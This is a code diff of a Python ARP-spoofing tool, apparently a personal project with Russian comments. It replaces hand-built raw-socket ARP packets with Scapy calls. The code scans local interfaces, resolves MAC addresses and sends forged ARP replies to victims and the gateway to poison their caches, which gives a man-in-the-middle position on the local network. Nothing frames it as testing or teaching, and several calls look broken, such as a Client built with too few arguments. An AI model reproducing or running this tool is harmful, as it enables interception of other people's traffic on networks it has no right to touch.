@@ -6,20 +6,22 @@ import binascii
 import psutil
 import time
 import os
+from scapy.all import *
+import sys
 
-
+from scapy.layers.l2 import ARP, Ether
 
 
 def get_default_gateway_linux():
     """Read the default gateway directly from /proc."""
     with open("/proc/net/route") as fh:
         for line in fh:
-            fields = line.strip().split()
-            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
+            field = line.strip().split()
+            if field[1] != '00000000' or not int(field[3], 16) & 2:
                 # If not default route or not RTF_GATEWAY, skip it
                 continue
 
-            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
+            return socket.inet_ntoa(struct.pack("<L", int(field[2], 16)))
 
 #return poperly formated mac adress
 def get_mac_adress(bytes_addres):
@@ -219,82 +221,34 @@ def factory(data):
         obj = ARP_packet(data)
     return obj
 
-
-
-def send_spoof_ARP(victim_ip, victim_mac, gateway_ip, mac):
-    interface = "wlan0"  # Прослушиваемый сетевой интерфейс
-    connect = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
-    connect.bind((interface, socket.htons(0x0800)))
-    arp_code = b'\x08\x06'  # Код протокола
-    htype = b'\x00\x01'  # Hardware Type
-    ptype = b'\x08\x00'  # Protocol Type
-    hlen = b'\x06'  # Hardware Length
-    plen = b'\x04'  # Protocol Length
-    operation = b'\x00\x02'  # Operation Code - Ответ
-    protocol = htype + ptype + hlen + plen + operation  # Собранное тело
-    eth_packet = victim_mac + mac + arp_code
-    request = eth_packet + protocol + mac + gateway_ip + victim_mac + victim_ip
-    connect.send(request)
-
-def send_request_ARP(victim_ip):
-    interface = "wlan0"  # Прослушиваемый сетевой интерфейс
-    connect = socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(0x0800))
-    connect.bind((interface, socket.htons(0x0800)))
-    arp_code = b'\x08\x06'  # Код протокола
-    htype = b'\x00\x01'  # Hardware Type
-    ptype = b'\x08\x00'  # Protocol Type
-    hlen = b'\x06'  # Hardware Length
-    plen = b'\x04'  # Protocol Length
-    operation = b'\x00\x01'  # Operation Code - Ответ
-    protocol = htype + ptype + hlen + plen + operation  # Собранное тело
-    victim_mac = b'000000'
-    eth_packet = victim_mac  + host_b_mac + arp_code
-    request = eth_packet + protocol + host_b_mac + host_b_ip + victim_mac + victim_ip
-    connect.send(request)
-
-def spoof(victim_ip, victim_mac, gateway_ip, gateway_mac, mac):
-    send_spoof_ARP(victim_ip, victim_mac, gateway_ip, mac)
-    send_spoof_ARP(gateway_ip, gateway_mac, victim_ip, mac)
+def spoof(victim_ip, victim_mac, gateway_ip, gateway_mac):
+    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac))
+    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac))
 
 def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
-    send_spoof_ARP(victim_ip, victim_mac, gateway_ip, gateway_mac)
-    send_spoof_ARP(gateway_ip, gateway_mac, victim_ip, victim_mac)
+    send(ARP(op = 2, pdst = gateway_ip, psrc = victim_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victim_mac), count = 7)
+    send(ARP(op = 2, pdst = victim_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7)
 
-#class Attack():
-#    def __init__(self, victim_ip, victim_mac, gateway_ip, gateway_mac, atacker_mac):
-#        self.victim_ip = victim_ip
-#        self.victim_mac = victim_mac
-#        self.gateway_ip = gateway_ip
-#        self.gateway_mac = gateway_mac
-#        self.atacker_mac = atacker_mac
-#
-#    def fire(self):
-#        try:
-#            spoof(self.victim_ip, self.victim_mac, self.gateway_ip, self.gateway_mac, self.atacker_mac)
-#        except:
-#            restore(self.victim_ip, self.victim_mac, self.gateway_ip, self.gateway_mac)
-
-
+def get_mac(IP, interface):
+    conf.verb = 0
+    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
+    for snd,rcv in ans:
+        return rcv.sprintf(r"%Ether.src%")
 
 class Client():
-    def __init__(self, ip, mac, b_ip, b_mac):
+    def __init__(self, ip, mac, interface):
         self.ip = ip
-        self.b_ip = b_ip
         self.mac = mac
-        self.b_mac = b_mac
         self.type = (self.ip == host_ip or self.ip == gateway_ip)
+        self.interface = interface
 
 class IPtable():
     def __init__(self):
         self.mac = host_mac
-        self.b_mac = host_b_mac
         self.ip = host_ip
-        self.b_ip = host_b_ip
         self.gateway_ip = gateway_ip
-        self.gateway_b_ip = gateway_b_ip
         self.gateway_mac = gateway_mac
-        self.gateway_b_mac = gateway_b_mac
-        self.clients = [Client(self.ip, self.mac, self.b_ip, self.b_mac), Client(self.gateway_ip, self.gateway_mac, self.gateway_b_ip, self.gateway_b_mac)]
+        self.clients = [Client(self.ip, self.mac, None), Client(self.gateway_ip, self.gateway_mac)]
 
     def find(self, client):
         for i, c in enumerate(self.clients):
@@ -305,45 +259,33 @@ class IPtable():
     def emplase(self, client):
         if (self.find(client) == -1):
             self.clients.append(client)
-            spoof(client.b_ip, client.b_mac, self.gateway_b_ip, self.gateway_b_mac, self.b_mac)
+            spoof(client.ip, client.mac, self.gateway_ip, self.gateway_mac)
 
     def drop(self, client):
         if (self.find(client) != -1):
             self.clients.append(client)
-            restore(client.b_ip, client.b_mac, self.gateway_b_ip, self.b_mac)
+            restore(client.ip, client.mac, self.gateway_ip, self.mac)
 
     def scan(self):
         interfaces = psutil.net_if_addrs()
         for interface_name, addresses in interfaces.items():
-            print(f"Интерфейс: {interface_name}")
             for address in addresses:
                 if address.family == psutil.AF_INET:  # IPv4-адрес
-                    send_request_ARP(socket.inet_aton(address.address))
+                    c = Client(address.address, get_mac(address.address, interface_name), interface_name)
+                    self.emplase(c)
 
     def attack(self):
         for client in self.clients:
             if (client.type == False):
-                spoof(client.b_ip, client.b_mac, self.gateway_b_ip, self.gateway_b_mac, self.mac)
+                spoof(client.ip, client.mac, self.gateway_ip, self.gateway_mac)
 
 
 def main():
     conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
-    send_request_ARP(gateway_b_ip)
-    t = time.time_ns()
-    while (time.time_ns() - t <= 1e9):
-        raw_data, address = conn.recvfrom(65535)
-        Seg = factory(raw_data)
-        if (Seg.type == "ARP" and Seg.SPA == gateway_ip and Seg.operation == 2 and Seg.TPA == host_ip):
-            gateway_mac, gateway_b_mac = Seg.SHA, Seg.b_SHA
-            break
+    gateway_mac = get_mac(gateway_b_ip)
     Ips = IPtable()
     Ips.scan()
     t = time.time_ns()
-    while (time.time_ns() - t <= 1e9):
-        raw_data, address = conn.recvfrom(65535)
-        Seg = factory(raw_data)
-        if (Seg.type == "ARP"  and Seg.operation == 2 and Seg.TPA == host_ip):
-            Ips.emplase(Client(Seg.SPA, Seg.SHA, Seg.b_SPA, Seg.b_SHA))
     Ips.attack()
     while (True):
         raw_data, address = conn.recvfrom(65535)
